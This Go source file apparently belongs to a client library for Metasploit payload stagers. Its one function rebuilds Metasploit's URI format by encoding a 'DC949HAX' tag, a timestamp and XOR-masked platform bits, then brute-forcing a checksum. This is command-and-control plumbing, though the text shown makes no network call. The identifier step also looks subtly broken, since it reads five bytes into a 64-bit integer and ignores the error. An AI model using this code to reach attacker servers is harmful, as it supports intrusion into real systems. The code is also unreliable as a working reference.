package msflib

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"math/rand"
	"runtime"
	"strings"
	"time"

	"github.com/vyrus001/base64url"
)

// RE'd from the way MSF makes URIs
func getURL() string {

	// init
	puid := "DC949HAX"
	timestamp := time.Now().UTC().Unix()
	platformXor := rand.Intn(255)
	archXor := rand.Intn(255)
	var arch int
	if strings.HasPrefix(runtime.GOARCH, "amd64") {
		arch = 2
	}

	// generate uuid
	var timeXor int32
	binary.Read(bytes.NewBuffer([]byte{
		byte(platformXor),
		byte(archXor),
		byte(platformXor),
		byte(archXor)}),
		binary.BigEndian, &timeXor)
	var uuid int64
	binary.Read(bytes.NewBuffer([]byte{
		byte(platformXor),
		byte(archXor),
		byte(platformXor ^ PLATFORM),
		byte(archXor ^ arch),
		byte(int64(timeXor) ^ timestamp)}),
		binary.BigEndian, &uuid)
	uri := base64url.Encode([]byte(puid + fmt.Sprintf("%x", uuid)))

	// bruteforce checksum
	for {
		// uuid + padding = uri
		uri = uri + base64url.Rand(1)

		// calculate uri checksum
		var sum int
		for _, ch := range uri {
			sum = sum + int(ch)
		}
		checksum := sum % 0x100

		// if at first your checksum is bad...
		if checksum == CHECKSUMMODE {
			return string(uri)
		}
	}
}
